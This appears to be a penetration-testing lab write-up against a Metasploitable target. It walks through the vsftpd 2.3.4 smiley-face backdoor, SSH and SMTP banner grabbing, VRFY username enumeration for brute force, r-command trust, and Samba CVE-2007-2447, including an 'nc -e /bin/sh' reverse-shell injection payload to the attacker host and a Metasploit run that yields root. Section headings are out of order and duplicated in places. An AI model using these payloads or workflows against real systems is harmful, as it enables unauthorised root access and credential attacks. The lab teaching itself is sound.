File Transfer Protocol — vsftpd 2.3.4

Transfers files between client and server over a control channel (port 21) and a separate data channel. This version contains a deliberately-inserted backdoor.

CVE-2011-2523 anonymous access MSF module available

C. The Backdoor — CVE-2011-2523

Critical — Backdoor in source distribution. Between June 30 and July 3, 2011, the vsftpd 2.3.4 tarball on the official site was silently replaced with a trojaned version. The malicious code was inserted into str.c. It has nothing to do with vsftpd's design — it's a supply-chain compromise.

Trigger mechanism: if the submitted username ends with :) (a smiley face), the daemon opens a listening shell on TCP port 6200 and spawns /bin/sh as root. The password is ignored entirely.

manual trigger concept
# Step 1 — Send the trigger username via netcat
nc -vn 10.0.2.13 21
# After banner appears, type:
USER backdoor:)
PASS anything

# Step 2 — Connect to the shell listener (separate terminal)
nc -vn 10.0.2.13 6200
Why a smiley face? It's a deliberate obfuscation technique — :) is unlikely to appear in real usernames but easy to include in a targeted trigger. The malicious author chose it knowing it would not trip up normal users.

22tcp

Secure Shell — OpenSSH 4.7p1 Debian-8ubuntu1

Encrypted remote administration. Despite being "secure" by design, this version reveals OS details, runs legacy cipher suites, and the system has known-weak default credentials.

CVE-2008-0166 weak credentials OS fingerprint MSF scanner available

A. Banner Grabbing

kali — netcat
nc -vn 10.0.2.13 22
response
(UNKNOWN) [10.0.2.13] 22 (ssh) open
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

This single banner reveals: SSHv2 (not the broken v1), OpenSSH 4.7p1 (released 2007), and Debian-8ubuntu1 which maps specifically to Ubuntu 8.04 LTS (Hardy Heron) and a Linux 2.6.24 kernel. That version string guides kernel exploit searches before even attempting authentication.

kali — nmap fingerprint
nmap -sV -p 22 10.0.2.13
response
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

B. Legacy Cipher Problem

Modern Kali's OpenSSH client disables weak key-exchange algorithms (KEX) and host-key types by default. Direct connection to this target fails with:

error
Unable to negotiate with 10.0.2.13 port 22: no matching host key type found.
Offered: ssh-rsa,ssh-dss

Fix — explicitly re-enable the legacy algorithms:

kali — ssh with legacy flags
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-dss,ssh-rsa \
    msfadmin@10.0.2.13

These flags tell your client to offer the old algorithms even though it normally refuses them — allowing the handshake to complete with the legacy server.

D. The Debian PRNG Flaw (CVE-2008-0166)

CVE-2008-0166 — Predictable key generation. An Ubuntu/Debian maintainer removed entropy-seeding lines from the OpenSSL RNG to silence compiler warnings. This reduced the keyspace of every generated SSH key (host and user) to only the process ID at generation time — maximum 32,767 unique keys per architecture. Precomputed rainbow tables of all possible keys allow key-based authentication without the private key, if any of those predictable keys are still installed as authorized keys on the target.

C. The Cleartext Wire Problem

Telnet does not encrypt anything. Every byte — including the username, password, and all shell output — appears as readable ASCII in any network capture on the same segment.

kali — capture Telnet traffic
tcpdump -i eth0 tcp port 23 -A

In Wireshark: filter tcp.port == 23, right-click any packet → Follow TCP Stream — the entire session appears including the plaintext password.

25tcp

SMTP — Postfix smtpd (Ubuntu)

Mail transfer protocol. This instance supports legacy VRFY and EXPN commands that allow username enumeration without any credentials.

VRFY enumeration MSF scanner available

A. Banner Grabbing

kali — netcat
nc -vn 10.0.2.13 25
response
(UNKNOWN) [10.0.2.13] 25 (smtp) open
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)

Disclosed: MTA type (Postfix), hostname/domain (metasploitable.localdomain), platform (Ubuntu). This banner alone confirms the domain name used in the lab environment.

B. Manual VRFY Enumeration

SMTP's VRFY command was designed to check whether a mailbox exists. On misconfigured servers it leaks valid system usernames — not just mail accounts.

full SMTP VRFY session
nc -vn 10.0.2.13 25
# After banner:
HELO test.local
VRFY root
VRFY msfadmin
VRFY administrator
VRFY nonexistentuser123
QUIT
server responses
250 metasploitable.localdomain
252 2.0.0 root                      ← EXISTS
252 2.0.0 msfadmin                  ← EXISTS
550 5.1.1 <administrator>: Recipient address rejected: User unknown   ← DOES NOT EXIST
550 5.1.1 <nonexistentuser123>: Recipient address rejected: User unknown
221 2.0.0 Bye
Response CodeMeaningAction
250 / 252User exists / recipient acceptedAdd to username list for credential attacks
550User unknown / rejectedDiscard — saves time in brute force stages

C. Why This Matters

VRFY → SSH / Telnet / FTP pipeline. You enumerate usernames via SMTP with no authentication, then use those confirmed usernames as the target list for SSH/Telnet/FTP brute force. Instead of testing thousands of made-up usernames, you only try accounts you know exist — dramatically reducing noise and time.

D. Automated Enumeration

Berkeley R-Commands — netkit-rsh (rexecd / rlogind / rshd)

1980s Unix remote access. Wildcard trust (+ +) in the r-command configuration grants unauthenticated root access to any connecting host, no password needed.

wildcard trust unauthenticated root MSF scanner available

A. How Host-Based Trust Works

The + + entry in ~/.rhosts or /etc/hosts.equiv:
First + = any remote host. Second + = any remote user. Combined: anybody on the network logs in as any local user, no credentials checked.

B. Nmap Scan

kali — nmap
nmap -A -p 512 10.0.2.13
real scan output

Nmap done: 1 IP address (1 host up) scanned in 4.54 seconds

OS guess is unreliable — "JUST GUESSING" because Nmap found no closed port to fingerprint against. Treat the OS estimate as noise.

B. CVE-2007-2447 — Username Map Script Injection

CVE-2007-2447 — Command injection via username field. When smb.conf defines a username map script, Samba passes the supplied username to /bin/sh via that script. Shell metacharacters (like backticks or $()) in the username are executed. Sending a username of /=`nohup nc -e /bin/sh 10.0.2.4 4444` grants a root shell.
Metasploit module: exploit/multi/samba/usermap_script
msfconsole
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 10.0.2.13
msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse_netcat
msf6 exploit(usermap_script) > set LHOST 10.0.2.4
msf6 exploit(usermap_script) > set LPORT 4444
msf6 exploit(usermap_script) > run

[*] Started reverse TCP handler on 10.0.2.4:4444
[*] Command shell session 1 opened (10.0.2.4:4444 -> 10.0.2.13:...)
id
uid=0(root) gid=0(root)
Verification first. Confirm smb.conf has a username map script entry before claiming CVE-2007-2447 is exploitable. The version alone is not proof; the specific configuration option must be present.
